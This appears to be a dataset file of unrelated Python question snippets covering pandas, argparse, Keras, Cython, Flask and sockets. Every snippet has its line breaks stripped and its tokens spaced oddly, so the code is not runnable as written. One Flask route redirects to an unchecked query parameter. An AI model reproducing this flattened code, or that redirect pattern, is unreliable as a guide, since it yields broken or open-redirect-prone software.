"from math import cosn = 50x = 1y = 1z = 1total = cos ( x ) + cos ( y ) + cos ( z ) for x in xrange ( n ) : for y in xrange ( n ) : for z in xrange ( n ) : if x + y + z == n : temp = cos ( x ) + cos ( y ) + cos ( z ) if temp > total : total = tempprint round ( total , 9 )"
"import pandas as pdimport numpy as np n = np.nanmemberships = { ' a ' : [ 'vowel ' ] , ' b ' : [ 'consonant ' ] , ' c ' : [ 'consonant ' ] , 'd ' : [ 'consonant ' ] , ' e ' : [ 'vowel ' ] , ' y ' : [ 'consonant ' , 'vowel ' ] } congruent = pd.DataFrame.from_dict ( { 'row ' : [ ' a ' , ' b ' , ' c ' , 'd ' , ' e ' , ' y ' ] , ' a ' : [ n , -.8 , -.6 , -.3 , .8 , .01 ] , ' b ' : [ -.8 , n , .5 , .7 , -.9 , .01 ] , ' c ' : [ -.6 , .5 , n , .3 , .1 , .01 ] , 'd ' : [ -.3 , .7 , .3 , n , .2 , .01 ] , ' e ' : [ .8 , -.9 , .1 , .2 , n , .01 ] , ' y ' : [ .01 , .01 , .01 , .01 , .01 , n ] , } ) .set_index ( 'row ' ) congruent.columns.names = [ 'col ' ] cs = congruent.stack ( ) .to_frame ( ) cs.columns = [ 'score ' ] cs.reset_index ( inplace=True ) cs.head ( 6 )"
"def myFun ( inputDict : Dict [ str , int ] ) : pass def myFun ( inputDict : collections.Counter ) : pass CounterTy = typing.TypeVar ( `` CounterTy '' , collections.Counter ) def myFun ( inputDict : CounterTy [ str ] ) : pass"
"def f ( ) : # whatever yield ( a , b ) aa , _ = zip ( *f ( ) )"
data Bint a = Leaf a | Branch a ( Bint a ) ( Bint a ) height ( Leaf a ) = 1height ( Branch a l r ) = 1 + ( max ( height l ) ( height r ) ) count ( Leaf a ) = 1count ( Branch a l r ) = 1 + ( count l ) + ( count r )
A B C1 nan nan2 nan 53 3 nan4 nan nan A B C1 0 02 0 53 3 nan4 nan nan
ExamplePackage > =0.2 -e git : //github.com/my-username/ExamplePackage.git @ v0.2
> > > float ( 'fish ' ) ValueError : invalid literal for float ( ) : fish ValueError : could not convert string to float : fish
python setup.py install ./setup.py install
"from uuid import uuid4from bottle import Bottle , responsefoo_app = Bottle ( ) @ foo_app.post ( '/foo ' ) def create ( ) : if not request.json : response.status = 400 return { 'error ' : 'ValidationError ' , 'error_message ' : 'Body required ' } body = request.json body.update ( { 'id ' : uuid4 ( ) .get_hex ( ) ) # persist to db # ORM might set 'id ' on the Model layer rather than setting it here # ORM will validate , as will db , so wrap this in a try/catch response.status = 201 return body @ foo_app.put ( '/foo/ < id > ' ) def update ( id ) : if not request.json : response.status = 400 return { 'error ' : 'ValidationError ' , 'error_message ' : 'Body required ' } elif 'id ' not in request.json : response.status = 400 return { 'error ' : 'ValidationError ' , 'error_message ' : ' ` id ` required ' } db = { } # should be actual db cursor or whatever if 'id ' not in db : response.status = 404 return { 'error ' : 'Not Found ' , 'error_message ' : 'Foo ` id ` `` { id } '' not found'.format ( id ) } body = request.json # persist to db , return updated object # another try/catch here in case of update error ( from ORM and/or db ) return body foo_app.post ( '/foo ' , middleware= [ HAS_BODY_F , ID_IN_DB_F ] )"
"# from __future__ import print_functionimport sysprint ( 'Python version = ' , sys.version ) try : raise Exception ( 'EXPECTED ' ) except : try : raise Exception ( 'UNEXPECTED ' ) except : pass raise # re-raises UNEXPECTED for Python 2 , and re-raises EXPECTED for Python 3 Python version = 2.7.15 ( v2.7.15 : ca079a3ea3 , Apr 30 2018 , 16:30:26 ) [ MSC v.1500 64 bit ( AMD64 ) ] Traceback ( most recent call last ) : File `` ./x '' , line 10 , in < module > raise Exception ( 'UNEXPECTED ' ) Exception : UNEXPECTED Python version = 3.6.8 ( default , Feb 14 2019 , 22:09:48 ) [ GCC 7.4.0 ] Traceback ( most recent call last ) : File `` ./x '' , line 7 , in < module > raise Exception ( 'EXPECTED ' ) Exception : EXPECTED Python version = 3.7.2 ( tags/v3.7.2:9a3ffc0492 , Dec 23 2018 , 23:09:28 ) [ MSC v.1916 64 bit ( AMD64 ) ] Traceback ( most recent call last ) : File `` ./x '' , line 7 , in < module > raise Exception ( 'EXPECTED ' ) Exception : EXPECTED # from __future__ import print_functionimport sysprint ( 'Python version = ' , sys.version ) def f ( ) : try : raise Exception ( 'UNEXPECTED ' ) except : passtry : raise Exception ( 'EXPECTED ' ) except : f ( ) raise # always raises EXPECTED Python version = 2.7.15 ( v2.7.15 : ca079a3ea3 , Apr 30 2018 , 16:30:26 ) [ MSC v.1500 64 bit ( AMD64 ) ] Traceback ( most recent call last ) : File `` ./x '' , line 13 , in < module > raise Exception ( 'EXPECTED ' ) Exception : EXPECTED"
"def FastModularExponentiation ( b , k , m ) : res = 1 b = b % m while ( k > 0 ) : if ( ( k & 1 ) == 1 ) : res = ( res * b ) % m k = k > > 1 b = ( b * b ) % m return res"
"items = [ ] def add_item ( item ) : items.append ( item ) # set up crawlercrawler = Crawler ( SpiderClass , settings=get_project_settings ( ) ) crawler.signals.connect ( add_item , signal=signals.item_passed ) # This is added to make the reactor stop , if I do n't use this , the code stucks at reactor.run ( ) line.crawler.signals.connect ( reactor.stop , signal=signals.spider_closed ) # @ UndefinedVariable crawler.crawl ( requestParams=requestParams ) # start crawling reactor.run ( ) # @ UndefinedVariablereturn str ( items ) Traceback ( most recent call last ) : File `` c : \python27\lib\site-packages\flask\app.py '' , line 1988 , in wsgi_app response = self.full_dispatch_request ( ) File `` c : \python27\lib\site-packages\flask\app.py '' , line 1641 , in full_dispatch_request rv = self.handle_user_exception ( e ) File `` c : \python27\lib\site-packages\flask\app.py '' , line 1544 , in handle_user_exception reraise ( exc_type , exc_value , tb ) File `` c : \python27\lib\site-packages\flask\app.py '' , line 1639 , in full_dispatch_request rv = self.dispatch_request ( ) File `` c : \python27\lib\site-packages\flask\app.py '' , line 1625 , in dispatch_request return self.view_functions [ rule.endpoint ] ( **req.view_args ) File `` F : \my_workspace\jobvite\jobvite\com\jobvite\web\RequestListener.py '' , line 38 , in submitForm reactor.run ( ) # @ UndefinedVariable File `` c : \python27\lib\site-packages\twisted\internet\base.py '' , line 1193 , in run self.startRunning ( installSignalHandlers=installSignalHandlers ) File `` c : \python27\lib\site-packages\twisted\internet\base.py '' , line 1173 , in startRunning ReactorBase.startRunning ( self ) File `` c : \python27\lib\site-packages\twisted\internet\base.py '' , line 684 , in startRunning raise error.ReactorNotRestartable ( ) ReactorNotRestartable"
"def generate ( ) : for x in obj.children ( ) : for y in x.children ( ) : for z in y.children ( ) : yield z.thing x = recursive ( obj , method= '' children '' , repeat=3 ) .thing"
"def do_something_with_hex ( c ) : `` '' '' > > > do_something_with_hex ( '\x00 ' ) '\x00 ' `` '' '' return repr ( c ) import doctestdoctest.testmod ( ) Failed example : do_something_with_hex ( ' ' ) Exception raised : Traceback ( most recent call last ) : File `` C : \Python27\lib\doctest.py '' , line 1254 , in __run compileflags , 1 ) in test.globs TypeError : compile ( ) expected string without null bytes**********************************************************************"
"class Stub : @ staticmethod def do_things ( ) : `` '' '' Call this like Stub.do_things ( ) , with no arguments or instance . '' '' '' print `` Doing things ! '' > > > Stub < class __main__.Stub at 0x ... > > > > Stub.do_things < function do_things at 0x ... > > > > Stub.__dict__ [ 'do_things ' ] < staticmethod object at 0x ... > > > > Stub.do_things ( ) Doing things ! def deco ( cls ) : def factory ( *args , **kwargs ) : # pretend there is some logic here determining # whether to make a new instance or not return cls ( *args , **kwargs ) return factory @ decoclass Stub : @ staticmethod def do_things ( ) : `` '' '' Call this like Stub.do_things ( ) , with no arguments or instance . '' '' '' print `` Doing things ! '' > > > Stub < function factory at 0x ... > > > > Stub.do_thingsTraceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > AttributeError : 'function ' object has no attribute 'do_things ' > > > Stub ( ) < __main__.Stub instance at 0x ... > > > > Stub ( ) .do_things < function do_things at 0x ... > > > > Stub ( ) .do_things ( ) Doing things ! def deco ( cls ) : @ functools.wraps ( cls ) def factory ( *args , **kwargs ) : # pretend there is some logic here determining # whether to make a new instance or not return cls ( *args , **kwargs ) return factory > > > Stub < function Stub at 0x ... > > > > Stub.do_things < staticmethod object at 0x ... > > > > Stub.do_things ( ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > TypeError : 'staticmethod ' object is not callable > > > Stub ( ) < __main__.Stub instance at 0x ... > > > > Stub ( ) .do_things < function do_things at 0x ... > > > > Stub ( ) .do_things ( ) Doing things ! class staticmethod ( object ) : `` '' '' Make @ staticmethods play nice with decorated classes . '' '' '' def __init__ ( self , func ) : self.func = func def __call__ ( self , *args , **kwargs ) : `` '' '' Provide the expected behavior inside decorated classes . '' '' '' return self.func ( *args , **kwargs ) def __get__ ( self , obj , objtype=None ) : `` '' '' Re-implement the standard behavior for undecorated classes . '' '' '' return self.funcdef deco ( cls ) : @ functools.wraps ( cls ) def factory ( *args , **kwargs ) : # pretend there is some logic here determining # whether to make a new instance or not return cls ( *args , **kwargs ) return factory @ decoclass Stub : @ staticmethod def do_things ( ) : `` '' '' Call this like Stub.do_things ( ) , with no arguments or instance . '' '' '' print `` Doing things ! '' > > > Stub < function Stub at 0x ... > > > > Stub.do_things < __main__.staticmethod object at 0x ... > > > > Stub.do_things ( ) Doing things ! > > > Stub ( ) < __main__.Stub instance at 0x ... > > > > Stub ( ) .do_things < function do_things at 0x ... > > > > Stub ( ) .do_things ( ) Doing things !"
"def is_gaussian_integer ( c ) : `` '' '' Checks whether a given real or complex number is a Gaussian integer , i.e . a complex number g = a + bi such that a and b are integers. `` '' '' if type ( c ) == int : return True return c.real.is_integer ( ) and c.imag.is_integer ( ) def gaussian_divisors ( g ) : `` '' '' Generates a sequence of Gaussian divisors of a rational or Gaussian integer g , i.e . a Gaussian integer d such that g / d is also a Gaussian integer. `` '' '' if not is_gaussian_integer ( g ) : return if g == 1 : yield complex ( g , 0 ) return g = complex ( g ) if type ( g ) == int or type ( g ) == float else g a = b = 1 ubound = int ( math.sqrt ( abs ( g ) ) ) for a in range ( -ubound , ubound + 1 ) : for b in range ( -ubound , ubound + 1 ) : if a or b : d = complex ( a , b ) if is_gaussian_integer ( g / d ) : yield d yield g In [ 92 ] : list ( gaussian_divisors ( 2 ) ) Out [ 92 ] : [ ( -1-1j ) , ( -1+0j ) , ( -1+1j ) , -1j , 1j , ( 1-1j ) , ( 1+0j ) , ( 1+1j ) , ( 2+0j ) ]"
"images , labels = cifar10.distorted_inputs ( ) batch_queue = tf.contrib.slim.prefetch_queue.prefetch_queue ( [ images , labels ] , capacity=2 * FLAGS.num_gpus ) # Calculate the gradients for each model tower.tower_grads = [ ] with tf.variable_scope ( tf.get_variable_scope ( ) ) : for i in xrange ( FLAGS.num_gpus ) : with tf.device ( '/gpu : % d ' % i ) : with tf.name_scope ( ' % s_ % d ' % ( cifar10.TOWER_NAME , i ) ) as scope : # Dequeues one batch for the GPU image_batch , label_batch = batch_queue.dequeue ( ) # Calculate the loss for one tower of the CIFAR model . This function # constructs the entire CIFAR model but shares the variables across # all towers . loss = tower_loss ( scope , image_batch , label_batch ) # Reuse variables for the next tower . tf.get_variable_scope ( ) .reuse_variables ( ) # Retain the summaries from the final tower . summaries = tf.get_collection ( tf.GraphKeys.SUMMARIES , scope ) # Calculate the gradients for the batch of data on this CIFAR tower . grads = opt.compute_gradients ( loss ) # Keep track of the gradients across all towers . tower_grads.append ( grads )"
"def split_at_first_false ( pred , seq ) : first = [ ] second = [ ] true_so_far = True for item in seq : if true_so_far and pred ( item ) : first.append ( item ) else : true_so_far = False second.append ( item ) return first , secondprint split_at_first_false ( str.isalpha , `` abc1a2b '' ) # ( [ ' a ' , ' b ' , ' c ' ] , [ ' 1 ' , ' a ' , ' 2 ' , ' b ' ] ) from itertools import chaindef split_at_pred ( pred , seq ) : head = [ ] it = iter ( seq ) for i in it : if not pred ( i ) : head.append ( i ) else : return iter ( head ) , chain ( [ i ] , it ) return iter ( head ) , iter ( [ ] ) from itertools import countsplit_at_pred ( lambda x : x == 5 , count ( ) )"
"class Person ( StructuredNode ) : name = StringProperty ( unique_index=True ) age = IntegerProperty ( index=True , default=0 )"
"input_shape = ( 32,32,10 ) num_classes = 15model = Sequential ( ) model.add ( Conv2D ( 32 , ( 3 , 3 ) , padding='same ' , input_shape=input_shape ) ) model.add ( Activation ( 'relu ' ) ) model.add ( Conv2D ( 32 , ( 3 , 3 ) ) ) model.add ( Activation ( 'relu ' ) ) model.add ( MaxPooling2D ( pool_size= ( 2 , 2 ) ) ) model.add ( Dropout ( 0.25 ) ) model.add ( Conv2D ( 64 , ( 3 , 3 ) , padding='same ' ) ) model.add ( Activation ( 'relu ' ) ) model.add ( Conv2D ( 64 , ( 3 , 3 ) ) ) model.add ( Activation ( 'relu ' ) ) model.add ( MaxPooling2D ( pool_size= ( 2 , 2 ) ) ) model.add ( Dropout ( 0.25 ) ) model.add ( Flatten ( ) ) model.add ( Dense ( 256 ) ) model.add ( Activation ( 'relu ' ) ) model.add ( Dropout ( 0.5 ) ) model.add ( Dense ( num_classes ) ) model.add ( Activation ( 'softmax ' ) )"
> > > win.windowFlags ( ) & QtCore.Qt.WindowStaysOnTopHint < PyQt4.QtCore.WindowFlags object at 0x7ad0578 > # enable always on topwin.windowFlags ( ) | QtCore.Qt.WindowStaysOnTopHint # disable itwin.windowFlags ( ) & ~QtCore.Qt.WindowStaysOnTopHint # toggle it win.windowFlags ( ) ^ QtCore.Qt.WindowStaysOnTopHint
"class A : def __str__ ( self ) : return `` A '' class B ( A ) : def __str__ ( self ) : return `` B '' b = B ( ) b_super = super ( B , b ) print ( str ( b_super ) ) # `` < super : < class ' B ' > , < B object > > '' print ( b_super.__str__ ( ) ) # `` A ''"
"def now ( ) : print `` Hello World ! `` class Sim : def __init__ ( self , arg , msg ) : self.msg = msg self.func = arg self.patch ( self.func ) def now ( self ) : print self.msg def run ( self ) : self.func ( ) def patch ( self , func ) : # Any references to the global now ( ) in func # are replaced with the self.now ( ) method.def myfunc ( ) : now ( ) > > > a = Sim ( myfunc , `` Hello Locals # 1 '' ) > > > b = Sim ( myfunc , `` Hello Locals # 2 '' ) > > > b.run ( ) Hello Locals # 2 > > > a.run ( ) Hello Locals # 1"
"Python 2.6.2 ( r262:71600 , Apr 16 2009 , 09:17:39 ) [ GCC 4.0.1 ( Apple Computer , Inc. build 5250 ) ] on darwinType `` help '' , `` copyright '' , `` credits '' or `` license '' for more information. > > > import csv > > > c = `` 1 , 2 , 3 , 4\n 5 , 6 , 7 , 8\n '' > > > test = csv.reader ( c ) > > > for t in test : ... print t ... [ ' 1 ' ] [ `` , `` ] [ ' ' ] [ ' 2 ' ] [ `` , `` ] [ ' ' ] [ ' 3 ' ] [ `` , `` ] [ ' ' ] [ ' 4 ' ] [ ] [ ' ' ] [ ' 5 ' ] [ `` , `` ] [ ' ' ] [ ' 6 ' ] [ `` , `` ] [ ' ' ] [ ' 7 ' ] [ `` , `` ] [ ' ' ] [ ' 8 ' ] [ ] > > >"
"{ % for dispN0 , tableDataSet0 in tabulatedTable.items % } { % for dispN in orderChanels % } { % for antenaName , antenaLevel in tableDataSet0 . { { dispN } } .items % } < td > { { antenaName } } < /td > { % endfor % } { % endfor % } { % endfor % }"
"class NodeDistance { protected : const Graph & G ; public : NodeDistance ( const Graph & G ) ; virtual ~NodeDistance ( ) ; virtual void preprocess ( ) = 0 ; virtual double distance ( node u , node v ) = 0 ; } ; class NeighborhoodDistance : public NetworKit : :NodeDistance { public : NeighborhoodDistance ( const Graph & G ) ; virtual ~NeighborhoodDistance ( ) ; virtual void preprocess ( ) ; virtual double distance ( node u , node v ) ; } ; cdef extern from `` ../cpp/distmeasures/NodeDistance.h '' : cdef cppclass _NodeDistance `` NetworKit : :NodeDistance '' : _NodeDistance ( _Graph G ) except + void preprocess ( ) except + double distance ( node , node ) except +cdef extern from `` ../cpp/distmeasures/NeighborhoodDistance.h '' : cdef cppclass _NeighborhoodDistance ( _NodeDistance ) `` NetworKit : :NeighborhoodDistance '' : _NeighborhoodDistance ( _Graph G ) except + void preprocess ( ) except + double distance ( node , node ) except + Error compiling Cython file : -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- ... void preprocess ( ) except + double distance ( node , node ) except +cdef extern from `` ../cpp/distmeasures/NeighborhoodDistance.h '' : cdef cppclass _NeighborhoodDistance ( _NodeDistance ) `` NetworKit : :NeighborhoodDistance '' : ^ -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- _NetworKit.pyx:1698:52 : Syntax error in C++ class definition"
"df = pd.DataFrame ( { 'user_id ' : [ 1 , 2 , 3 , 4 , 1 , 2 , 3 ] , 'class_type ' : [ 'Krav Maga ' , 'Yoga ' , 'Ju-jitsu ' , 'Krav Maga ' , 'Ju-jitsu ' , 'Krav Maga ' , 'Karate ' ] , 'instructor ' : [ 'Bob ' , 'Alice ' , 'Bob ' , 'Alice ' , 'Alice ' , 'Alice ' , 'Bob ' ] } ) In [ 36 ] : df.groupby ( 'user_id ' ) .agg ( lambda x : set ( x ) ) Out [ 36 ] : class_type instructoruser_id1 { Krav Maga , Ju-jitsu } { Alice , Bob } 2 { Yoga , Krav Maga } { Alice } 3 { Ju-jitsu , Karate } { Bob } 4 { Krav Maga } { Alice } In [ 37 ] : df.groupby ( 'user_id ' ) .agg ( set ) Out [ 37 ] : class_type instructoruser_id1 { user_id , class_type , instructor } { user_id , class_type , instructor } 2 { user_id , class_type , instructor } { user_id , class_type , instructor } 3 { user_id , class_type , instructor } { user_id , class_type , instructor } 4 { user_id , class_type , instructor } { user_id , class_type , instructor }"
"A = array ( [ [ 1 , 1 , 0 , 2 ] , [ 1 , 0 , 0 , 2 ] , [ 1 , 1 , 0 , 2 ] ] ) B = array ( [ 0 , 5 , 3 ] ) C = array ( [ [ 5 , 5 , 0 , 3 ] , [ 5 , 0 , 0 , 3 ] , [ 5 , 5 , 0 , 3 ] ] )"
"def __enter__ ( ) : print ( `` __enter__ < `` ) def __exit__ ( *exc ) : print ( `` __exit__ < { 0 } '' .format ( exc ) ) class cls : def __enter__ ( self ) : print ( `` cls.__enter__ < `` ) def __exit__ ( self , *exc ) : print ( `` cls.__exit__ < { 0 } '' .format ( exc ) ) import modwith mod : pass Traceback ( most recent call last ) : File `` ./test.py '' , line 3 , in < module > with mod : AttributeError : __exit__"
"wnba.Height.describe ( ) count 143.000000mean 184.566434std 8.685068min 165.00000025 % 176.50000050 % 185.00000075 % 191.000000max 206.000000Name : Height , dtype : float64"
"import cv2cap = cv2.VideoCapture ( 'example_file ' ) frame_positions = [ 200 , 400 , 8000 , 200000 ] for frame_position in frame_positions : cap.set ( cv2.cv.CV_CAP_PROP_FRAMES , frame_position ) img = cap.read ( ) cv2.imshow ( 'window ' , img ) cv2.waitKey ( 0 )"
"import zlibdef processFiles ( ) : ... s = `` '' '' Large string more than 2Gb '' '' '' data = zlib.compress ( s ) ... ERROR : Traceback ( most recent call last ) : # 012 File `` ./../commands/sce.py '' , line 438 , in processFiles # 012 data = zlib.compress ( s ) # 012OverflowError : size does not fit in an int # python -VPython 2.7.3 # uname -aLinux app2 3.2.0-4-amd64 # 1 SMP Debian 3.2.54-2 x86_64 GNU/Linux # free total used free shared buffers cachedMem : 65997404 8096588 57900816 0 184260 7212252-/+ buffers/cache : 700076 65297328Swap : 35562236 0 35562236 # ldconfig -p | grep pythonlibpython2.7.so.1.0 ( libc6 , x86-64 ) = > /usr/lib/libpython2.7.so.1.0libpython2.7.so ( libc6 , x86-64 ) = > /usr/lib/libpython2.7.so"
while True : for i in l : # do something
"connhash = s.recv ( 1024 ) [ Errno 10054 ] An existing connection was forcibly closed by the remote host stringfmt = u ' % ( user ) s ; % ( host ) s : % ( port ) d'string = stringfmt % datastructfmt = ' ! bh'encoded = string.encode ( 'utf-16BE ' ) packetbytes = struct.pack ( structfmt , 2 , len ( encoded ) ) +encodeds.send ( packetbytes ) connhash = s.recv ( 1024 )"
a/ __init__.py models.py views.py ... b/ __init__.py models.py views.py ...
"class identifier ( ) : def __init__ ( self , d ) : self.my_dict = d self.my_frozenset = frozenset ( d.items ( ) ) def __getitem__ ( self , item ) : return self.my_dict [ item ] def __hash__ ( self ) : return hash ( self.my_frozenset ) def __eq__ ( self , rhs ) : return self.my_frozenset == rhs.my_frozenset def __ne__ ( self , rhs ) : return not self == rhs class node : def __init__ ( self , id , value ) : # id is of type identifier self.id = id self.value = value # define other data here ... def __hash__ ( self ) : return hash ( self.id ) def __eq__ ( self , rhs ) : if isinstance ( rhs , node ) : return self.id == rhs.id # # # for the case when rhs is an identifier ; this allows dictionary # # # node lookup of a key without wrapping it in a node return self.id == rhs def __ne__ ( self , rhs ) : return not self == rhs d = { } n1 = node ( identifier ( { 'name ' : 'Bob ' } ) , value=1 ) n2 = node ( identifier ( { 'name ' : 'Alex ' } ) , value=2 ) n3 = node ( identifier ( { 'name ' : 'Alex ' , 'nationality ' : 'Japanese ' } ) , value=3 ) d [ n1 ] = 'Node 1 'd [ n2 ] = 'Node 2 'd [ n3 ] = 'Node 3 ' my_id = identifier ( { 'name ' : 'Alex ' } )"
"> > > a = 1 > > > b = 1 > > > a == bTrue > > > a.__eq__ ( b ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > AttributeError : 'int ' object has no attribute '__eq__ '"
"class Test ( object ) : def __iter__ ( self ) : return self def next ( self ) : return 1test = Test ( ) def new_next ( self ) : return 2test.next = type ( test.__class__.next ) ( new_next , test , test.__class__ ) print test.next ( ) # 2print next ( test ) # 1"
( define-derived-mode snake-mode fundamental-mode ... ) ( define-derived-mode snake-mode fundamental-mode ( global-set-key ( kbd `` \t '' ) ( kbd `` C-q \t '' ) ) ... )
"In [ 1 ] : x = [ 1 ] In [ 2 ] : x+ '' foo '' -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -TypeError Traceback ( most recent call last ) C : \Users\Marcin\ < ipython-input-2-94cd84126ddc > in < module > ( ) -- -- > 1 x+ '' foo '' TypeError : can only concatenate list ( not `` str '' ) to listIn [ 3 ] : x+= '' foo '' In [ 4 ] : xOut [ 4 ] : [ 1 , ' f ' , ' o ' , ' o ' ]"
string = 'TTHHTHHTHHHHTTHHHTTT '
"import numpy as npvector = np.zeros ( ( 8,1 ) ) vector [ 2,1 ] = 1vector [ 3,1 ] = 1 00010000 -- > 0000000110100000 -- > 0000010111000001 -- > 0000011100000000 -- > 0000000011111111 -- > 1111111110101010 -- > 0101010111110000 -- > 0000111100111000 -- > 0000011110001111 -- > 00011111"
language : pythonpython : - `` 2.5 '' - `` 2.6 '' - `` 2.7 '' env : - DJANGO=1.3.4 - DJANGO=1.4.2 - DJANGO=https : //github.com/django/django/zipball/masterinstall : - pip install -q Django== $ DJANGO -- use-mirrors - pip install -e . -- use-mirrorsscript : - python src/runtests.py
"# Check configuration tokens # Ensure build layout # Check configuration tokens # Preparing build # Check requirements for android # Install platform # Apache ANT found at /home/ali/.buildozer/android/platform/apache-ant-1.9.4 # Android SDK is missing , downloading # Unpacking Android SDK # Command failed : tar xzf android-sdk_r20-linux.tgz # # Buildozer failed to execute the last command # If the error is not obvious , please raise the log_level to 2 # and retry the latest command. # In case of a bug report , please add a full log with log_level = 2 $ buildozer android_new debug"
"def create_app ( object_name ) : app = Flask ( __name__ ) app.config.from_object ( object_name ) babel = Babel ( app ) app.register_blueprint ( main_blueprint ) app.register_blueprint ( category_blueprint ) app.register_blueprint ( item_blueprint ) db.init_app ( app ) return app @ babel.localeselectordef get_locale ( ) : if 'locale ' in session : return session [ 'locale ' ] return request.accept_languages.best_match ( LANGUAGES.keys ( ) ) @ application.route ( '/locale/ < locale > / ' , methods= [ 'GET ' ] ) def set_locale ( locale ) : session [ 'locale ' ] = locale redirect_to = request.args.get ( 'redirect_to ' , '/ ' ) return redirect ( redirect_to ) # Change this to previous url"
"class A : ... class B : as = models.ManyToManyField ( A ) class A : ... class C : a = models.ForeignKey ( A ) b = models.ForeignKey ( `` B '' ) extra_data = models.BooleanField ( default=False ) class B : as = models.ManyToManyField ( A , through=C )"
"s.index= [ 0.0,1.1,2.2,3.3,4.4,5.5 ] s.index # Float64Index ( [ 0.0 , 1.1 , 2.2 , 3.3 , 4.4 , 5.5 ] , dtype='float64 ' ) s # 0.0 141.125 # 1.1 142.250 # 2.2 143.375 # 3.3 143.375 # 4.4 144.500 # 5.5 145.125s.index=s.index.astype ( 'float32 ' ) # s.index # Float64Index ( [ 0.0 , 1.100000023841858 , 2.200000047683716 , # 3.299999952316284 , 4.400000095367432 , 5.5 ] , # dtype='float64 ' )"
"parser = argparse.ArgumentParser ( prog='PROG'parser.add_argument ( ' -- foo ' , type=int ) parser.add_argument ( 'bar ' , nargs= ' ? ' ) # invalid optionparser.parse_args ( [ ' -- bar ' ] ) usage : PROG [ -h ] [ -- foo FOO ] [ bar ] PROG : error : no such option : -- bar import argparseimport datetimedef convertIsoTime ( timestamp ) : `` '' '' read ISO-8601 time-stamp using the AMS conventional format YYYY-MM-DDThh : mm : ssUTC '' '' '' try : return datetime.datetime.strptime ( timestamp , '' % Y- % m- % dT % H : % M : % SUTC '' ) except : raise argparse.ArgumentTypeError ( `` ' { } ' is not a valid ISO-8601 time-stamp '' .format ( timestamp ) ) parser = argparse.ArgumentParser ( ) parser.add_argument ( 'startTime ' , type=convertIsoTime ) parser.add_argument ( ' -- good ' , type=int , help='foo ' ) args = parser.parse_args ( [ ' -- gold ' , ' 5 ' , '2015-01-01T00:00:00UTC ' ] ) error : argument startTime : ' 5 ' is not a valid ISO-8601 time-stamp error : no such option : -- gold # Process command-line argumentswhile [ $ # -gt 0 ] ; do case `` $ 1 '' in -- debug ) DEBUGOPTION= '' -- debug '' shift break ; ; -- ) shift break ; ; -- * ) handleUsageError `` $ 1 '' shift ; ; * ) break ; ; esacdone"
"main.py/module/module/__init__.py ( empty ) /module.py import loggingfrom module import modulelogger = logging.getLogger ( __name__ ) def test ( ) : logger.warning ( 'in main.py/test ' ) def main ( ) : handler = logging.StreamHandler ( ) handler.setLevel ( logging.INFO ) formatter = logging.Formatter ( ' % ( asctime ) s % ( name ) s/ % ( module ) s [ % ( levelname ) s ] : % ( message ) s ' , ' % Y- % m- % d % H : % M : % S ' ) handler.setFormatter ( formatter ) logger.addHandler ( handler ) logger.warning ( 'in main.py/main ' ) module.something ( ) if __name__ == `` __main__ '' : main ( ) import logginglogger = logging.getLogger ( __name__ ) def something ( ) : logger.warning ( 'in module.py/something ' ) 2019-10-01 09:03:40 __main__/main [ WARNING ] : in main.py/mainin module.py/something 2019-10-01 09:04:13 root/main [ WARNING ] : in main.py/main2019-10-01 09:04:13 module.module/module [ WARNING ] : in module.py/something"
"import abcclass ParentAbstractStrategy ( metaclass=abc.ABCMeta ) : @ abc.abstractmethod def __init__ ( self , attr1 ) : self.attr1 = attr1 @ abc.abstractmethod def strategy ( self , arg1 , arg2 , **kwargs ) : raise NotImplementedErrorclass ChildAbstractStrategy ( ParentAbstractStrategy , metaclass=abc.ABCMeta ) : @ abc.abstractmethod def __init__ ( self , attr1 , attr2 ) : super ( ) .__init__ ( attr1 ) self.attr2 = attr2 @ abc.abstractmethod def strategy ( self , arg1 , arg2 , **kwargs ) : raise NotImplementedErrorclass ConcreteStrategyA ( ParentAbstractStrategy ) : def __init__ ( self , attr1 ) : super ( ) .__init__ ( attr1 ) def strategy ( self , arg1 , arg2 , **kwargs ) : print ( arg1 , arg2 ) class ConcreteStrategyB ( ChildAbstractStrategy ) : def __init__ ( self , attr1 , attr2 ) : super ( ) .__init__ ( attr1 , attr2 ) def strategy ( self , arg1 , arg2 , **kwargs ) : print ( arg1 , arg2 ) arg3 = kwargs.get ( `` arg3 '' , None ) if arg3 is None : raise ValueError ( `` Missing arg3 '' ) else : print ( arg3 ) > > > a = ConcreteStrategyA ( 1 ) > > > a.attr11 > > > a.strategy ( `` a '' , `` b '' ) a b > > > b = ConcreteStrategyB ( 1 , 2 ) > > > b.attr11 > > > b.attr22 > > > b.strategy ( `` a '' , `` b '' ) a bTraceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` /home/space/strategy.py '' , line 42 , in strategy raise ValueError ( `` Missing arg3 '' ) ValueError : Missing arg3 > > > b.strategy ( `` a '' , `` b '' , arg3= '' c '' ) a bc"
def func_name ( ) : print func_name.__name__ def func_name ( ) : print self.__name__
"a = np.ones ( ( 10 , 5 ) ) a [ : ,2 ] or a [ : , [ 1,3,4 ] ] a [ : , exclude ( 1 ) ] *= 0"
"def generate_data ( imagePathTraining , imagesize , nBatches ) : datagen = ImageDataGenerator ( rescale=1./255 ) generator = datagen.flow_from_directory\ ( directory=imagePathTraining , # path to the target directory target_size= ( imagesize , imagesize ) , # dimensions to which all images found will be resize color_mode='rgb ' , # whether the images will be converted to have 1 , 3 , or 4 channels classes=None , # optional list of class subdirectories class_mode='categorical ' , # type of label arrays that are returned batch_size=nBatches , # size of the batches of data shuffle=True ) # whether to shuffle the data return generatordef create_model ( imagesize , nBands , nClasses ) : print ( `` % s : Creating the model ... '' % datetime.now ( ) .strftime ( ' % Y- % m- % d_ % H- % M- % S ' ) ) # Create pre-trained base model basemodel = ResNet50 ( include_top=False , # exclude final pooling and fully connected layer in the original model weights='imagenet ' , # pre-training on ImageNet input_tensor=None , # optional tensor to use as image input for the model input_shape= ( imagesize , # shape tuple imagesize , nBands ) , pooling=None , # output of the model will be the 4D tensor output of the last convolutional layer classes=nClasses ) # number of classes to classify images into print ( `` % s : Base model created with % i layers and % i parameters . '' % ( datetime.now ( ) .strftime ( ' % Y- % 